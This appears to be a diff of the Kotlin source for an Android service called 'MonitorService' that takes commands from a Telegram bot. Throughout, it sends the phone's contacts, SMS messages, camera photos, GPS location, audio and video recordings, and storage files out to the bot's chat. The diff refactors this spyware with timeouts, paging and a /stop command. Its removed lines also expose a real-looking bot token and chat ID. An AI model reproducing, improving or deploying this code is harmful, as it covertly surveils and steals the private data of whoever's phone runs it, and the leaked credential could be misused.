@@ -8,7 +8,6 @@ import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
@@ -32,9 +31,12 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.Job
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.cancel
+import kotlinx.coroutines.coroutineScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.withTimeout
+import kotlinx.coroutines.TimeoutCancellationException
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.MultipartBody
 import okhttp3.OkHttpClient
@@ -46,6 +48,7 @@ import java.io.File
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import java.util.concurrent.CountDownLatch
 import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 import java.util.zip.ZipEntry
@@ -54,14 +57,15 @@ import java.util.zip.ZipOutputStream
 class MonitorService : LifecycleService() {
 
     companion object {
-        private const val BOT_TOKEN = "8512990339:AAE-PXlxR_xp8vsQ_M1Rm8sxXE7NL4f3X9c"
-        private const val CHAT_ID   = "8937193601"
+        private const val BOT_TOKEN = "YOUR-TELEGRAM-BOT-TOKEN"
+        private const val CHAT_ID   = "YOUR-CHAT-ID"
 
-        private const val TAG             = "MonitorService"
-        private const val NOTIFICATION_ID = 1001
-        private const val POLL_INTERVAL_MS = 8_000L
-        private const val HEARTBEAT_INTERVAL_MS = 5 * 60 * 1000L
-        private const val CHUNK_LIMIT = 49L * 1_048_576L
+        private const val TAG              = "MonitorService"
+        private const val NOTIFICATION_ID  = 1001
+        private const val POLL_INTERVAL_MS = 5_000L
+        private const val HEARTBEAT_MS     = 5 * 60 * 1000L
+        private const val CHUNK_LIMIT      = 49L * 1_048_576L
+        private const val PAGE_SIZE        = 15   // items per allfiles message
 
         private const val PREFS_NAME         = "monitor_prefs"
         private const val PREF_DEVICE_NAME   = "device_name"
@@ -77,25 +81,17 @@ class MonitorService : LifecycleService() {
         private val URL_SEND_DOCUMENT = "$BASE_URL/sendDocument"
         private val URL_SEND_AUDIO    = "$BASE_URL/sendAudio"
         private val URL_GET_FILE      = "$BASE_URL/getFile"
-
-        // Known valid commands (for wrong-command detection)
-        private val KNOWN_COMMANDS = setOf(
-            "/start", "/help", "/alive", "/status",
-            "/alldevice", "/setdevice", "/switchdevice",
-            "/allcontacts", "/contacts", "/allsms", "/sms",
-            "/camera", "/frontcam", "/frontcamera",
-            "/location",
-            "/audio",
-            "/allfiles",
-            "/zip",
-            "/video",
-            "/files"
-        )
     }
 
-    // ── Caches ──
-    private val folderFileCache = mutableMapOf<String, List<File>>()
-    private val folderPathCache = mutableMapOf<String, String>()   // chatId → current path
+    // ── Per-chat state ──
+    // Stores numbered items (folders first, then files) for the current path
+    private data class FsItem(val name: String, val file: File, val isDir: Boolean)
+    private val fsCache      = mutableMapOf<String, List<FsItem>>()  // chatId → numbered list
+    private val pathCache    = mutableMapOf<String, String>()         // chatId → current relPath
+
+    // ── Stop flag per chat ──
+    private val stopFlags    = mutableMapOf<String, Boolean>()
+    private val activeJobs   = mutableMapOf<String, Job>()
 
     // ── WakeLock ──
     private var wakeLock: PowerManager.WakeLock? = null
@@ -106,7 +102,7 @@ class MonitorService : LifecycleService() {
         .writeTimeout(120, TimeUnit.SECONDS)
         .build()
 
-    private val serviceScope  = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
     private var pollJob: Job? = null
     private var heartbeatJob: Job? = null
 
@@ -145,7 +141,7 @@ class MonitorService : LifecycleService() {
             PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE)
         (getSystemService(ALARM_SERVICE) as android.app.AlarmManager).set(
             android.app.AlarmManager.ELAPSED_REALTIME,
-            android.os.SystemClock.elapsedRealtime() + 1_000L, pi)
+            android.os.SystemClock.elapsedRealtime() + 1000L, pi)
     }
 
     override fun onDestroy() {
@@ -177,8 +173,8 @@ class MonitorService : LifecycleService() {
 
     private fun loadDeviceIdentity() {
         val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
-        val defaultName = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
-        deviceName   = prefs.getString(PREF_DEVICE_NAME, defaultName) ?: defaultName
+        val def   = "${Build.MANUFACTURER} ${Build.MODEL}".trim()
+        deviceName   = prefs.getString(PREF_DEVICE_NAME, def) ?: def
         deviceNumber = prefs.getInt(PREF_DEVICE_NUMBER, 1)
     }
 
@@ -210,39 +206,72 @@ class MonitorService : LifecycleService() {
                     put("text", "__hb__ $deviceNumber|$deviceName|$now")
                     put("disable_notification", true)
                 }
-                val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
-                httpClient.newCall(Request.Builder().url(URL_SEND_MSG).post(body).build())
+                httpClient.newCall(Request.Builder().url(URL_SEND_MSG)
+                    .post(json.toString().toRequestBody("application/json".toMediaTypeOrNull())).build())
                     .execute().use {}
             } catch (_: Exception) {}
-            delay(HEARTBEAT_INTERVAL_MS)
+            delay(HEARTBEAT_MS)
         }
     }
 
     // ══════════════════════════════════════════════════════════════════════════
-    //  POLLING
+    //  POLLING — each command in its own Job with 90s timeout
     // ══════════════════════════════════════════════════════════════════════════
 
     private suspend fun pollLoop() {
         while (serviceScope.isActive) {
             try {
-                fetchUpdates().forEach { handleUpdate(it) }
+                fetchUpdates().forEach { update ->
+                    val chatId = update.optJSONObject("message")
+                        ?.optJSONObject("chat")?.optString("id") ?: CHAT_ID
+                    val rawText = update.optJSONObject("message")
+                        ?.optString("text", "")?.trim() ?: ""
+
+                    // /stop cancels active job immediately
+                    if (rawText.trim().lowercase() == "/stop") {
+                        activeJobs[chatId]?.cancel()
+                        activeJobs.remove(chatId)
+                        stopFlags[chatId] = true
+                        sendMessage(chatId, "${dp()}🛑 *Stopped.*", "Markdown")
+                        return@forEach
+                    }
+
+                    // Cancel previous job for this chat if still running
+                    activeJobs[chatId]?.cancel()
+                    stopFlags[chatId] = false
+
+                    val job = serviceScope.launch {
+                        try {
+                            withTimeout(90_000L) { handleUpdate(update) }
+                        } catch (e: TimeoutCancellationException) {
+                            sendMessage(chatId, "${dp()}⏰ *Timeout* — took >90s. Ready for next command.", "Markdown")
+                        } catch (e: Exception) {
+                            if (e.message?.contains("StandaloneCoroutine was cancelled") == false)
+                                sendMessage(chatId, "${dp()}❌ Error: ${e.message}")
+                        }
+                    }
+                    activeJobs[chatId] = job
+                }
             } catch (_: Exception) {}
             delay(POLL_INTERVAL_MS)
         }
     }
 
+    private fun isStopped(chatId: String) = stopFlags[chatId] == true
+
     private fun fetchUpdates(): List<JSONObject> {
         val body = httpClient.newCall(
             Request.Builder().url("$URL_GET_UPDATES?offset=$updateOffset&limit=10&timeout=0").get().build()
-        ).execute().use { r -> if (!r.isSuccessful) return emptyList(); r.body?.string() } ?: return emptyList()
-
+        ).execute().use { r ->
+            if (!r.isSuccessful) return emptyList()
+            r.body?.string()
+        } ?: return emptyList()
         val json = JSONObject(body)
         if (!json.optBoolean("ok", false)) return emptyList()
         val result  = json.getJSONArray("result")
         val updates = mutableListOf<JSONObject>()
         for (i in 0 until result.length()) {
-            val u = result.getJSONObject(i)
-            updates.add(u)
+            val u = result.getJSONObject(i); updates.add(u)
             val id = u.getLong("update_id")
             if (id >= updateOffset) updateOffset = id + 1
         }
@@ -253,31 +282,28 @@ class MonitorService : LifecycleService() {
     //  COMMAND DISPATCHER
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleUpdate(update: JSONObject) {
+    private suspend fun handleUpdate(update: JSONObject) {
         val message = update.optJSONObject("message") ?: return
         val chatId  = message.optJSONObject("chat")?.optString("id") ?: CHAT_ID
         val rawText = message.optString("text", "").trim()
 
-        // Heartbeat - silent
-        if (rawText.startsWith("__hb__ ")) { parseAndStoreHeartbeat(rawText); return }
+        if (rawText.startsWith("__hb__ ")) { parseHeartbeat(rawText); return }
 
-        // Incoming file from user
-        val document = message.optJSONObject("document")
+        val doc      = message.optJSONObject("document")
         val photoArr = message.optJSONArray("photo")
         when {
-            document != null -> { handleIncomingDocument(chatId, document); return }
+            doc != null -> { handleIncomingDoc(chatId, doc); return }
             photoArr != null && photoArr.length() > 0 -> {
-                handleIncomingDocument(chatId,
-                    photoArr.getJSONObject(photoArr.length() - 1),
+                handleIncomingDoc(chatId, photoArr.getJSONObject(photoArr.length() - 1),
                     "photo_${System.currentTimeMillis()}.jpg"); return
             }
         }
 
         if (rawText.isEmpty()) return
         val text = rawText.substringBefore("@").lowercase(Locale.getDefault())
-        Log.i(TAG, "Command: $text")
+        Log.i(TAG, "CMD: $text")
 
-        // ── Global commands (all devices respond) ──
+        // Global
         when {
             text == "/alldevice" -> { handleAllDevice(chatId); return }
             text.startsWith("/switchdevice") -> { handleSwitchDevice(chatId, rawText.removePrefix("/switchdevice").trim()); return }
@@ -286,77 +312,62 @@ class MonitorService : LifecycleService() {
 
         if (!isActiveDevice()) return
 
-        // ── Route commands ──
         when {
             text == "/start" || text == "/help" -> handleHelp(chatId)
             text == "/alive" || text == "/status" -> handleStatus(chatId)
 
             // Contacts
-            text == "/allcontacts" -> handleContacts(chatId, limit = Int.MAX_VALUE)
+            text == "/allcontacts" -> handleContacts(chatId, Int.MAX_VALUE)
             text.matches(Regex("/contacts\\d+")) -> handleContacts(chatId, text.removePrefix("/contacts").toInt())
-            text == "/contacts" -> handleContacts(chatId, limit = 50)
+            text == "/contacts" -> handleContacts(chatId, 50)
 
             // SMS
-            text == "/allsms" -> handleSms(chatId, filter = "", limit = Int.MAX_VALUE)
-            text.matches(Regex("/sms\\d+")) -> handleSms(chatId, filter = "", limit = text.removePrefix("/sms").toInt())
-            text == "/sms" -> handleSms(chatId, filter = "", limit = 20)
-            text.startsWith("/sms ") -> handleSms(chatId, filter = rawText.removePrefix("/sms ").trim(), limit = Int.MAX_VALUE)
+            text == "/allsms" -> handleSms(chatId, "", Int.MAX_VALUE)
+            text.matches(Regex("/sms\\d+")) -> handleSms(chatId, "", text.removePrefix("/sms").toInt())
+            text == "/sms" -> handleSms(chatId, "", 20)
+            text.startsWith("/sms ") -> handleSms(chatId, rawText.removePrefix("/sms ").trim(), Int.MAX_VALUE)
 
-            // Camera — single shot
-            text == "/camera" -> handleCameraInterval(chatId, CameraSelector.DEFAULT_BACK_CAMERA, count = 1)
-            text == "/frontcam" || text == "/frontcamera" ->
-                handleCameraInterval(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, count = 1)
-
-            // Camera — interval mode: /camera5 or /frontcamera5
-            text.matches(Regex("/camera\\d+")) ->
-                handleCameraInterval(chatId, CameraSelector.DEFAULT_BACK_CAMERA,
-                    count = text.removePrefix("/camera").toInt())
-            text.matches(Regex("/frontcam\\d+")) ->
-                handleCameraInterval(chatId, CameraSelector.DEFAULT_FRONT_CAMERA,
-                    count = text.removePrefix("/frontcam").toInt())
-            text.matches(Regex("/frontcamera\\d+")) ->
-                handleCameraInterval(chatId, CameraSelector.DEFAULT_FRONT_CAMERA,
-                    count = text.removePrefix("/frontcamera").toInt())
+            // Camera
+            text == "/camera" -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA, 1)
+            text.matches(Regex("/camera\\d+")) -> handleCamera(chatId, CameraSelector.DEFAULT_BACK_CAMERA, text.removePrefix("/camera").toInt())
+            text == "/frontcam" || text == "/frontcamera" -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, 1)
+            text.matches(Regex("/frontcam\\d+")) -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, text.removePrefix("/frontcam").toInt())
+            text.matches(Regex("/frontcamera\\d+")) -> handleCamera(chatId, CameraSelector.DEFAULT_FRONT_CAMERA, text.removePrefix("/frontcamera").toInt())
 
             // Location
             text == "/location" -> handleLocation(chatId)
 
             // Audio
-            text == "/audio" -> sendMessage(chatId, "${dp()}ℹ️ Usage: `/audio <seconds>`\nExample: /audio30", "Markdown")
+            text == "/audio" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /audio30 (seconds)", "Markdown")
             text.matches(Regex("/audio\\d+")) -> handleAudio(chatId, text.removePrefix("/audio").toInt())
-            text.startsWith("/audio ") -> handleAudio(chatId, text.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
+            text.startsWith("/audio ") -> handleAudio(chatId, rawText.removePrefix("/audio ").trim().toIntOrNull() ?: 10)
 
             // Video
-            text == "/video" -> sendMessage(chatId, "${dp()}ℹ️ Usage: `/video <seconds>` or `/video <seconds> front`\nExample: /video30 front", "Markdown")
+            text == "/video" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /video30 or /video30 front", "Markdown")
             text.startsWith("/video") -> handleVideo(chatId, rawText)
 
-            // All Files (new file manager)
-            text == "/allfiles" -> handleAllFiles(chatId, "")
-            text.startsWith("/allfiles ") -> {
-                val arg = rawText.removePrefix("/allfiles ").trim()
-                val parts = arg.split(" ")
-                val num = parts.last().toIntOrNull()
-                if (num != null && parts.size >= 2) handleAllFilesSelect(chatId, num)
+            // File manager
+            text == "/allfiles" || text == "/files" -> handleAllFiles(chatId, "")
+
+            text.startsWith("/allfiles ") || text.startsWith("/files ") -> {
+                val arg = rawText.removePrefix("/allfiles ").removePrefix("/files ").trim()
+                val num = arg.toIntOrNull()
+                if (num != null) handleFsSelect(chatId, num)
                 else handleAllFiles(chatId, arg)
             }
+
+            // Plain number → navigate or download from current listing
+            text.matches(Regex("\\d+")) -> handleFsSelect(chatId, text.toInt())
 
             // ZIP
-            text == "/zip" -> sendMessage(chatId, "${dp()}ℹ️ Usage: `/zip <path>`\nExample: /zip DCIM/Camera", "Markdown")
+            text == "/zip" -> sendMessage(chatId, "${dp()}ℹ️ Usage: /zip DCIM/Camera", "Markdown")
             text.startsWith("/zip ") -> handleZip(chatId, rawText.removePrefix("/zip ").trim())
 
-            // Legacy /files
-            text == "/files" -> handleAllFiles(chatId, "")
-            text.startsWith("/files ") -> {
-                val arg = rawText.removePrefix("/files ").trim()
-                val num = arg.toIntOrNull()
-                if (num != null) handleAllFilesSelect(chatId, num)
-                else handleAllFiles(chatId, arg)
-            }
-
             // Wrong command
-            text.startsWith("/") -> sendMessage(chatId, "${dp()}❌ Wrong command: `$text`\nSend /help to see all commands.", "Markdown")
+            text.startsWith("/") -> sendMessage(chatId,
+                "${dp()}❌ Wrong command: `$text`\nSend /help for all commands.", "Markdown")
 
-            else -> { /* plain text, ignore */ }
+            else -> {}
         }
     }
 
@@ -364,7 +375,7 @@ class MonitorService : LifecycleService() {
     //  MULTI-DEVICE
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun parseAndStoreHeartbeat(raw: String) {
+    private fun parseHeartbeat(raw: String) {
         try {
             val parts = raw.removePrefix("__hb__ ").split("|")
             if (parts.size >= 3) {
@@ -376,83 +387,68 @@ class MonitorService : LifecycleService() {
         } catch (_: Exception) {}
     }
 
-    private fun handleAllDevice(chatId: String) {
+    private suspend fun handleAllDevice(chatId: String) {
         val prefs     = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         val activeNum = prefs.getInt(PREF_ACTIVE_DEVICE, deviceNumber)
         val lastSeen  = prefs.getLong("last_heartbeat_$deviceNumber", 0L)
         val agoMs     = System.currentTimeMillis() - lastSeen
-        val alive     = if (agoMs < 6 * 60 * 1000L) "🟢 Online" else "🔴 Offline (${formatAgo(agoMs)})"
-        val activeStr = if (activeNum == deviceNumber) " ← *ACTIVE*" else ""
-        sendMessage(chatId,
-            "📱 *Device $deviceNumber: $deviceName*$activeStr\nStatus: $alive\n`/switchdevice $deviceNumber` to activate",
-            "Markdown")
+        val alive     = if (agoMs < 6 * 60 * 1000L) "🟢 Online" else "🔴 Offline"
+        val active    = if (activeNum == deviceNumber) " ← *ACTIVE*" else ""
+        sendMessage(chatId, "📱 *$deviceNumber. $deviceName*$active\n$alive\n`/switchdevice $deviceNumber`", "Markdown")
     }
 
-    private fun handleSwitchDevice(chatId: String, arg: String) {
-        val num = arg.trim().toIntOrNull()
-        if (num == null) { sendMessage(chatId, "❌ Usage: /switchdevice <number>"); return }
+    private suspend fun handleSwitchDevice(chatId: String, arg: String) {
+        val num = arg.trim().toIntOrNull() ?: run { sendMessage(chatId, "❌ Usage: /switchdevice 2"); return }
         getSharedPreferences(PREFS_NAME, MODE_PRIVATE).edit().putInt(PREF_ACTIVE_DEVICE, num).apply()
-        if (num == deviceNumber)
-            sendMessage(chatId, "✅ Now controlling:\n📱 *$deviceNumber. $deviceName*", "Markdown")
+        if (num == deviceNumber) sendMessage(chatId, "✅ Now controlling: 📱 *$deviceNumber. $deviceName*", "Markdown")
     }
 
-    private fun handleSetDevice(chatId: String, arg: String) {
-        if (arg.isBlank()) { sendMessage(chatId, "❌ Usage: /setdevice <name>"); return }
+    private suspend fun handleSetDevice(chatId: String, arg: String) {
+        if (arg.isBlank()) { sendMessage(chatId, "❌ Usage: /setdevice MyPhone"); return }
         deviceName = arg.trim(); saveDeviceIdentity()
-        sendMessage(chatId, "✅ Renamed to: 📱 *$deviceNumber. $deviceName*", "Markdown")
+        sendMessage(chatId, "✅ Renamed: 📱 *$deviceNumber. $deviceName*", "Markdown")
     }
 
     // ══════════════════════════════════════════════════════════════════════════
     //  HELP & STATUS
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleHelp(chatId: String) {
+    private suspend fun handleHelp(chatId: String) {
         sendMessage(chatId, """
-${dp()}🤖 *All Commands*
+${dp()}🤖 *Commands*
 
 📱 *Multi-Device*
-/alldevice — All devices + status
-/switchdevice 2 — Switch to device 2
-/setdevice <name> — Rename this device
+/alldevice · /switchdevice 2 · /setdevice Name
 
-📶 *Basic*
-/alive — Phone online check
+📶 /alive — Online check
 
 📷 *Camera*
-/camera — 1 rear photo
-/camera5 — 5 rear photos (3s interval)
-/frontcam — 1 front photo
-/frontcam5 — 5 front photos (3s interval)
+/camera · /camera5 (5 photos, 3s apart)
+/frontcam · /frontcam5
 
-📍 /location — GPS + Maps link
+📍 /location
 
 👥 *Contacts*
-/allcontacts — All contacts
-/contacts20 — First 20 contacts
+/allcontacts · /contacts20
 
 💬 *SMS*
-/allsms — All SMS
-/sms10 — Last 10 SMS
-/sms <number> — SMS with that number
+/allsms · /sms10 · /sms <number>
 
-🎙️ *Audio*
-/audio30 — Record 30 seconds
+🎙️ /audio30 — Record 30s
 
 🎥 *Video*
-/video30 — Rear cam 30s
-/video30 front — Front cam 30s
+/video30 · /video30 front
 
 📂 *File Manager*
-/allfiles — Browse storage
-/allfiles <folder> — Open folder
-/allfiles <folder> <num> — Download file
+/allfiles — Browse /storage/emulated/0
+Type a *number* to open folder or download file
+/zip <path> — ZIP folder (auto-split 49MB)
 
-🗜️ *ZIP*
-/zip <path> — ZIP folder/file (auto-split 49MB)
+🛑 /stop — Stop current operation
         """.trimIndent(), "Markdown")
     }
 
-    private fun handleStatus(chatId: String) {
+    private suspend fun handleStatus(chatId: String) {
         val t = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
         sendMessage(chatId, "${dp()}✅ *Online*\n🕐 $t", "Markdown")
     }
@@ -461,29 +457,31 @@ ${dp()}🤖 *All Commands*
     //  CONTACTS
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleContacts(chatId: String, limit: Int) {
-        if (!hasPermission(Manifest.permission.READ_CONTACTS)) {
-            sendMessage(chatId, "${dp()}⚠️ READ_CONTACTS permission not granted."); return
+    private suspend fun handleContacts(chatId: String, limit: Int) {
+        if (!hasPerm(Manifest.permission.READ_CONTACTS)) {
+            sendMessage(chatId, "${dp()}⚠️ READ_CONTACTS permission missing."); return
         }
-        val estSec = 2
-        sendMessage(chatId, "${dp()}📒 Loading contacts…\n⏳ ~${estSec}s | 0%")
-        val contacts = readContacts(limit)
-        if (contacts.isEmpty()) { sendMessage(chatId, "${dp()}📭 No contacts found."); return }
         val label = if (limit == Int.MAX_VALUE) "All" else "$limit"
-        var sent = 0
-        val sb = StringBuilder("${dp()}📒 *Contacts ($label)* — ${contacts.size} total\n\n")
-        contacts.forEachIndexed { i, (name, num) ->
-            sb.append("${i + 1}. *$name*\n   `$num`\n")
-            val pct = ((i + 1) * 100 / contacts.size)
-            if (sb.length > 3_800) {
-                sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
-                sb.clear()
-                sent += 1
-                sendMessage(chatId, "${dp()}📤 Sending… $pct%")
+        sendMessage(chatId, "${dp()}📒 Loading contacts… | 0%")
+        val list = readContacts(limit)
+        if (list.isEmpty()) { sendMessage(chatId, "${dp()}📭 No contacts."); return }
+        var page = StringBuilder("${dp()}📒 *Contacts ($label) — ${list.size} total*\n\n")
+        var lineCount = 0
+        list.forEachIndexed { i, (name, num) ->
+            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped."); return }
+            page.append("${i + 1}. *$name*  `$num`\n")
+            lineCount++
+            val pct = ((i + 1) * 100 / list.size)
+            if (lineCount >= PAGE_SIZE || i == list.size - 1) {
+                sendMessage(chatId, page.toString().trimEnd(), "Markdown")
+                if (i < list.size - 1) {
+                    page = StringBuilder()
+                    lineCount = 0
+                    sendMessage(chatId, "${dp()}📤 $pct% …")
+                }
             }
         }
-        if (sb.isNotBlank()) sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
-        sendMessage(chatId, "${dp()}✅ Done — ${contacts.size} contacts sent.")
+        sendMessage(chatId, "${dp()}✅ Done — ${list.size} contacts.")
     }
 
     private fun readContacts(limit: Int): List<Pair<String, String>> {
@@ -493,13 +491,12 @@ ${dp()}🤖 *All Commands*
             arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                     ContactsContract.CommonDataKinds.Phone.NUMBER),
             null, null,
-            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
-        ) ?: return list
+            "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC") ?: return list
         cursor.use {
             val nc = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
             val pc = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
             while (it.moveToNext() && list.size < limit)
-                list.add(Pair(it.getString(nc) ?: "Unknown", it.getString(pc) ?: "N/A"))
+                list.add(Pair(it.getString(nc) ?: "?", it.getString(pc) ?: "?"))
         }
         return list
     }
@@ -508,40 +505,42 @@ ${dp()}🤖 *All Commands*
     //  SMS
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleSms(chatId: String, filter: String, limit: Int) {
-        if (!hasPermission(Manifest.permission.READ_SMS)) {
-            sendMessage(chatId, "${dp()}⚠️ READ_SMS permission not granted."); return
+    private suspend fun handleSms(chatId: String, filter: String, limit: Int) {
+        if (!hasPerm(Manifest.permission.READ_SMS)) {
+            sendMessage(chatId, "${dp()}⚠️ READ_SMS permission missing."); return
         }
         val label = when {
             filter.isNotEmpty() -> "SMS with $filter"
             limit == Int.MAX_VALUE -> "All SMS"
             else -> "Last $limit SMS"
         }
-        sendMessage(chatId, "${dp()}💬 Loading $label…\n⏳ Please wait | 0%")
+        sendMessage(chatId, "${dp()}💬 Loading $label… | 0%")
         val msgs = readSms(filter, limit)
-        if (msgs.isEmpty()) { sendMessage(chatId, "${dp()}📭 No messages found."); return }
+        if (msgs.isEmpty()) { sendMessage(chatId, "${dp()}📭 No messages."); return }
         val dateFmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
-        val sb = StringBuilder("${dp()}💬 *$label* — ${msgs.size} msgs\n\n")
+        var page = StringBuilder("${dp()}💬 *$label — ${msgs.size} msgs*\n\n")
+        var lineCount = 0
         msgs.forEachIndexed { i, msg ->
-            val pct  = ((i + 1) * 100 / msgs.size)
-            val addr = msg.optString("address", "Unknown")
-            val body = run {
-                val raw = msg.optString("body", "")
-                val trimmed = if (raw.length > 200) raw.take(200) + "…" else raw
-                trimmed.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`").replace("[", "\\[")
-            }
+            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped."); return }
+            val addr  = msg.optString("address", "?")
+            val raw   = msg.optString("body", "")
+            val body  = (if (raw.length > 150) raw.take(150) + "…" else raw)
+                .replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
             val date  = dateFmt.format(Date(msg.optLong("date")))
             val emoji = if (msg.optInt("type") == Telephony.Sms.MESSAGE_TYPE_SENT) "📤" else "📨"
-            val line  = "$emoji *$addr*\n   🕐 $date\n   $body\n\n"
-            if (sb.length + line.length > 3_800) {
-                sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
-                sb.clear()
-                sendMessage(chatId, "${dp()}📤 Sending… $pct%")
+            page.append("$emoji *$addr*  🕐$date\n$body\n\n")
+            lineCount++
+            val pct = ((i + 1) * 100 / msgs.size)
+            if (lineCount >= PAGE_SIZE || i == msgs.size - 1) {
+                sendMessage(chatId, page.toString().trimEnd(), "Markdown")
+                if (i < msgs.size - 1) {
+                    page = StringBuilder()
+                    lineCount = 0
+                    sendMessage(chatId, "${dp()}📤 $pct% …")
+                }
             }
-            sb.append(line)
         }
-        if (sb.isNotBlank()) sendMessage(chatId, sb.toString().trimEnd(), "Markdown")
-        sendMessage(chatId, "${dp()}✅ Done — ${msgs.size} messages sent.")
+        sendMessage(chatId, "${dp()}✅ Done — ${msgs.size} messages.")
     }
 
     private fun readSms(filter: String, limit: Int): List<JSONObject> {
@@ -551,56 +550,48 @@ ${dp()}🤖 *All Commands*
         val cursor = contentResolver.query(
             Telephony.Sms.CONTENT_URI,
             arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
-            sel, args, "${Telephony.Sms.DATE} DESC"
-        ) ?: return list
+            sel, args, "${Telephony.Sms.DATE} DESC") ?: return list
         cursor.use { c ->
             val ac = c.getColumnIndex(Telephony.Sms.ADDRESS)
             val bc = c.getColumnIndex(Telephony.Sms.BODY)
             val dc = c.getColumnIndex(Telephony.Sms.DATE)
             val tc = c.getColumnIndex(Telephony.Sms.TYPE)
-            while (c.moveToNext() && list.size < limit) {
+            while (c.moveToNext() && list.size < limit)
                 list.add(JSONObject().apply {
-                    put("address", c.getString(ac) ?: "Unknown")
+                    put("address", c.getString(ac) ?: "?")
                     put("body", c.getString(bc) ?: "")
                     put("date", c.getLong(dc))
                     put("type", c.getInt(tc))
                 })
-            }
         }
         return list
     }
 
     // ══════════════════════════════════════════════════════════════════════════
-    //  CAMERA — INTERVAL MODE
+    //  CAMERA
     // ══════════════════════════════════════════════════════════════════════════
 
-    private fun handleCameraInterval(chatId: String, selector: CameraSelector, count: Int) {
-        if (!hasPermission(Manifest.permission.CAMERA)) {
-            sendMessage(chatId, "${dp()}⚠️ CAMERA permission not granted."); return
+    private suspend fun handleCamera(chatId: String, sel: CameraSelector, count: Int) {
+        if (!hasPerm(Manifest.permission.CAMERA)) {
+            sendMessage(chatId, "${dp()}⚠️ CAMERA permission missing."); return
         }
-        val label = if (selector == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
+        val label = if (sel == CameraSelector.DEFAULT_FRONT_CAMERA) "front" else "rear"
         val total = count.coerceIn(1, 50)
-        if (total == 1) {
-            sendMessage(chatId, "${dp()}📷 Taking photo ($label)…")
-        } else {
-            val estSec = total * 3
-            sendMessage(chatId, "${dp()}📷 Taking $total photos ($label) every 3s…\n⏳ ~${estSec}s | 0%")
-        }
-        serviceScope.launch {
-            for (i in 1..total) {
-                val pct = (i * 100 / total)
-                takeOneCameraPhoto(chatId, selector, i, total)
-                if (i < total) {
-                    sendMessage(chatId, "${dp()}📷 Photo $i/$total sent | $pct%\n⏳ Next in 3s…")
-                    delay(3_000L)
-                }
+        if (total > 1) sendMessage(chatId, "${dp()}📷 Taking $total photos ($label) every 3s…\n⏳ ~${total * 3}s | 0%")
+        for (i in 1..total) {
+            if (isStopped(chatId)) { sendMessage(chatId, "${dp()}🛑 Stopped at $i/$total."); return }
+            val pct = (i * 100 / total)
+            takePhoto(chatId, sel, "📸 $i/$total")
+            if (i < total) {
+                sendMessage(chatId, "${dp()}📷 Photo $i/$total sent | $pct%\n⏳ Next in 3s…")
+                delay(3_000L)
             }
-            if (total > 1) sendMessage(chatId, "${dp()}✅ Done — $total photos sent.")
         }
+        if (total > 1) sendMessage(chatId, "${dp()}✅ $total photos done.")
     }
 
-    private fun takeOneCameraPhoto(chatId: String, selector: CameraSelector, idx: Int, total: Int) {
-        val latch = java.util.concurrent.CountDownLatch(1)
+    private fun takePhoto(chatId: String, selector: CameraSelector, caption: String) {
+        val latch = CountDownLatch(1)
         mainHandler.post {
             val future = ProcessCameraProvider.getInstance(this)
             future.addListener({
@@ -618,21 +609,17 @@ ${dp()}🤖 *All Commands*
                         object : ImageCapture.OnImageSavedCallback {
                             override fun onImageSaved(out: ImageCapture.OutputFileResults) {
                                 mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
-                                sendPhotoWithCaption(chatId, file,
-                                    "${dp()}📸 Photo $idx/$total")
-                                file.delete()
-                                latch.countDown()
+                                sendPhoto(chatId, file, "${dp()}$caption")
+                                file.delete(); latch.countDown()
                             }
                             override fun onError(e: ImageCaptureException) {
                                 mainHandler.post { try { provider?.unbindAll() } catch (_: Exception) {} }
-                                sendMessage(chatId, "${dp()}❌ Camera error: ${e.message}")
-                                latch.countDown()
+                                sendMessage(chatId, "${dp()}❌ Camera: ${e.message}"); latch.countDown()
                             }
                         })
                 } catch (e: Exception) {
